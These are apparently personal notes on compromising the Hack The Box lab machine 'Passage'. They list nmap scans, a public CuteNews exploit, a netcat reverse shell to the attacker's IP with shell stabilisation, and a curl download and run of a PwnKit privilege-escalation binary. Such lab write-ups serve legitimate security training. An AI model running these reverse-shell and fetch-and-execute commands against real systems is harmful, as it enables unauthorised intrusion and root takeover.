Passage
========================

## Enumeration

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn passage.htb | tee nmap_udp_output.txt

![qownnotes-media-pZSaEL](../../../media/qownnotes-media-pZSaEL.png)

    sudo nmap_enum passage.htb | tee nmap_output.txt

![qownnotes-media-NeXDOE](../../../media/qownnotes-media-NeXDOE.png)


![qownnotes-media-UrySkB](../../../media/qownnotes-media-UrySkB.png)

## Exploitation

    searchsploit cute news
    
    searchsploit -x php/webapps/48800.py
    
    ## Tested on Ubuntu
    
    cp /usr/share/exploitdb/exploits/php/webapps/48800.py exploit_temp.py

    python exploit_temp.py
    http://passage.htb

![qownnotes-media-JXfSzN](../../../media/qownnotes-media-JXfSzN.png)

    nc -e /bin/bash 10.10.14.7 80
    rlwrap nc -nlvp 80
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    <CTRL+Z>
    stty raw -echo; fg
    reset
 
## Privilege Escalation

    find / -perm -u=s -type f 2>/dev/null
    cat /proc/version
    curl http://10.10.14.7:8000/PwnKit_comp -o pwnkit
    chmod +x pwnkit
    ./pwnkit
    
![qownnotes-media-osbEVi](../../../media/qownnotes-media-osbEVi.png)
 